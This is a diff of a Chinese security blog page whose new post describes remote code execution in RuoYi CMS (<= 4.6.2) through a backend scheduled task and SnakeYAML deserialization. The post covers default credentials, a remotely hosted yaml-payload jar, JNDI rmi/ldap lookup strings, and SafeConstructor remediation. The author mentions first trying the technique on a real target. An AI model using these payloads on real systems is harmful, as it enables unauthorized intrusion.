@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="记一个有关utools工具的小坑, 博客">
+    <meta name="keywords" content="1, 博客">
     <meta name="description" content="个人博客">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>记一个有关utools工具的小坑 | 杰同学的自留地</title>
+    <title>1 | 杰同学的自留地</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -316,12 +316,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">记一个有关utools工具的小坑</h1>
+                    <h1 class="description center-align post-title">1</h1>
                 </div>
             </div>
         </div>
@@ -435,25 +435,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E5%B0%8F%E4%BA%8B/">
-                                <span class="chip bg-color">小事</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%B0%8F%E8%AE%B0/" class="post-category">
-                                小记
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -462,7 +449,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-10-30
+                    2023-12-17
                 </div>
                 
 
@@ -476,14 +463,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    218
+                    1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -508,12 +495,65 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>utools是大多数人都会使用的工具，它可以大大提高我们的生产效率。可是今天在安装工具，并配置环境变量的时候不小心被它给坑了。。。</p>
-<p>我配置环境变量的时候，非常依赖于utools，在它那边输入<code>hj</code>后，就可以立刻帮我调出环境变量配置界面。配置完成后，当我再次快捷键调出utool并且通过它调出cmd验证自己刚才的工具安装是否成功时，给我的回应如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20230428172644181.png" alt="image-20230428172644181"></p>
-<p>我以为是自己配置错误，导致命令没能加载出来，进行多次尝试，依旧未果。</p>
-<p>当我在想问题到底出在哪里时，我随手通过<code>win</code>+<code>R</code>快捷键调出新的cmd，再次运行该工具，发现成功！</p>
-<p>难不成真的是utools的问题？</p>
+                <h1 id="若依-cms-后台写入计划任务-RCE"><a href="#若依-cms-后台写入计划任务-RCE" class="headerlink" title="若依 cms 后台写入计划任务 RCE"></a>若依 cms 后台写入计划任务 RCE</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一次失败的 getshell。</p>
+<p>本来一处资产通过弱口令 admin、admin123进入后台，但是没能发现后台是什么 cms 或者框架写的，尝试了一些上传点没成功后就继续测其他资产了，好在有高人指点，发现后台有一处可以写入定时任务，上网搜了相关文章，才发现这个后台是若依 cms ，有历史漏洞就是通过这处定时任务能够 rce。遗憾的是这个后台是个高版本的若依搭建的，最终没能成功利用，不过顺便写了这篇笔记。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>RuoYi &lt;= v4.6.2</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>若依的项目下载地址在这里：</p>
+<p><a href="https://github.com/yangzongzhuan/RuoYi/releases" target="_blank" rel="noopener">https://github.com/yangzongzhuan/RuoYi/releases</a></p>
+<p>这里我在本地搭建的环境为版本v4.6.1的，在影响版本范围内。</p>
+<p>需要下载redis服务，在本地6379开启redis服务。具体搭建细节可以参考这个博客：<a href="https://blog.csdn.net/qq_41607217/article/details/118904019" target="_blank" rel="noopener">https://blog.csdn.net/qq_41607217/article/details/118904019</a></p>
+<p>搭建完成后，运行项目，即可通过浏览器访问对应端口，得到如下后台登录页面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702430541928-e54d8b72-f80a-4132-9d38-0cba3d692824.png" alt="image.png"></p>
+<p>默认用户名和密码输入admin:admin123,即可登录后台</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702430655019-172909c0-0c46-4063-ba0a-a8daee3e5213.png" alt="image.png"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞产生处是系统监控模块中的定时任务，在其中调用目标字符串中填入恶意的payload，即可利用计划任务进行rce</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702430697066-a8c45b6e-12df-46e1-99d3-cd602289ceb0.png" alt="image.png"></p>
+<p>关于payload，有大佬已经在github上写好了，地址如下：<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p>
+<p>下载下来后，需要将  AwesomeScriptEngineFactory.java 文件中的命令执行语句改成自己要执行的命令，如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702477603911-cf8635b1-f775-4be6-8923-c8094fbaa5bd.png" alt="6f503dce133098200a033870cc83a612.png"></p>
+<p>注：这里我利用的 dnslog进行验证，使用的是<a href="http://ceye.io/%E8%BF%99%E4%B8%AA" target="_blank" rel="noopener">http://ceye.io/这个</a> dnslog平台。</p>
+<p>然后在src所在目录下打开cmd运行如下语句，将该项目编译成jar</p>
+<p>最后得到yaml-payload.jar文件，将其丢到自己的vps上，然后在vps上开启http服务，这里我利用python开启个简易的文件下载http服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702431475550-6c8aa773-7f9f-40a1-940a-a4c68604300a.png" alt="image.png"></p>
+<p>然后在刚刚登陆的若依cms后台，添加定时任务，这里构造的调用目标字符串如下：</p>
+<p>其中cron表达式 0/10 * * * * ? 意思是每10秒执行一次调用目标字符串的任务，这里就不详细说明了,留到下一篇笔记记录学习。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702432332419-07db0a0c-561d-41ee-a5bf-8f52bddedd42.png" alt="image.png"></p>
+<p>这里我写入后，点击任务状态下的那个按钮，启动定时任务，但是发现最后一直没执行成功，点开上面日志后才发现运行失败了（下图），后来猜测是我搭建平台的问题，想到windows平台不存在类似cron表达式的计划任务形式，索性我就直接改成macos平台测试了，和linux差不多的计划任务方式。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/33587794/1702433690487-06cbfbaa-b10b-4cae-b760-28a471987821.png" alt="image.png"></p>
+<p>换成 mac后（mac 系统和 linux 系统相近，也有计划任务），搭建相同的环境，再次利用，终于看到回显结果（我 mac 电脑主机名是 jackielee）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702478318713-de879e25-53f0-47be-bd24-62beb169f5d7.png" alt="c56601fd01eb59f2230bed88e4ea49b4.png"></p>
+<p> 漏洞产生原因 </p>
+<p>若依后台管理系统使用了snakeyaml 的jar包，snakeyaml是用来解析yaml的格式，可用于Java对象的序列化、反序列化。而若依后台管理系统可以通过定时任务功能构造payload远程调用jar包，从而导致 RCE。</p>
+<p>当然还可以尝试下面两种打法：</p>
+<pre class=" language-shell"><code class="language-shell">org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://127.0.0.1:1099/refObj')
+
+javax.naming.InitialContext.lookup('ldap://127.0.0.1:9999/#Exploit')
+</code></pre>
+<p> 漏洞修复 </p>
+<p>首先是修复yaml 反序列化问题，加入new SafeConstructor()类进行过滤</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">main</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+        String context <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>
+
+                <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>
+
+                <span class="token string">"    !!java.net.URL [\"http://ip:1234/yaml-payload.jar\"]\n"</span> <span class="token operator">+</span>
+
+                <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>
+                <span class="token string">"]"</span><span class="token punctuation">;</span>
+
+        Yaml yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SafeConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//加入new SafeConstructor()类进行过滤</span>
+
+        yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+</code></pre>
+<p>再次进行反序列化会抛异常。 再者就是拒绝不安全的反序列化操作，反序列化数据前需要经过校验或拒绝反序列化数据可控。</p>
+<p>高版本的若依 cms还屏蔽了 http、rmi、ldap 这些协议，也难怪我没能成功 getshell那个若依后台。</p>
 
                 
             </div>
@@ -530,7 +570,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">anch0r</a>
+                    <a href="/about" rel="external nofollow noreferrer">jackieya</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -540,7 +580,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://jackieya.github.io/2022/10/30/you-guan-utools-gong-ju-de-xiao-keng/">https://jackieya.github.io/2022/10/30/you-guan-utools-gong-ju-de-xiao-keng/</a>
+                    <a href="https://jackieya.github.io/2023/12/17/1/">https://jackieya.github.io/2023/12/17/1/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -553,7 +593,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">anch0r</a>
+                    <a href="/about" target="_blank">jackieya</a>
                     !
                 </span>
             </div>
@@ -577,11 +617,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/%E5%B0%8F%E4%BA%8B/">
-                                    <span class="chip bg-color">小事</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -761,13 +797,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/04/05/wo-de-bo-ke/">
+                <a href="/2023/12/17/ruo-yi-cms-hou-tai-xie-ru-ji-hua-ren-wu-rce/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="我的博客搭建">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="若依 cms 后台写入计划任务 RCE">
                         
-                        <span class="card-title">我的博客搭建</span>
+                        <span class="card-title">若依 cms 后台写入计划任务 RCE</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -778,57 +814,8 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-05
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-12-17
                         </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%85%B6%E4%BB%96/" class="post-category">
-                                    其他
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E5%89%8D%E8%A8%80/">
-                        <span class="chip bg-color">前言</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/09/10/ics-windows/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="ICS Windows v2.0">
-                        
-                        <span class="card-title">ICS Windows v2.0</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-10
-                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -844,8 +831,57 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%B0%8F%E8%AE%B0/">
-                        <span class="chip bg-color">小记</span>
+                    <a href="/tags/%E8%8B%A5%E4%BE%9Dcms/">
+                        <span class="chip bg-color">若依cms</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/04/11/php-zui-duan-yi-ju-hua/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="php最短一句话">
+                        
+                        <span class="card-title">php最短一句话</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%B0%8F%E8%AE%B0/" class="post-category">
+                                    小记
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D/">
+                        <span class="chip bg-color">一句话</span>
                     </a>
                     
                 </div>
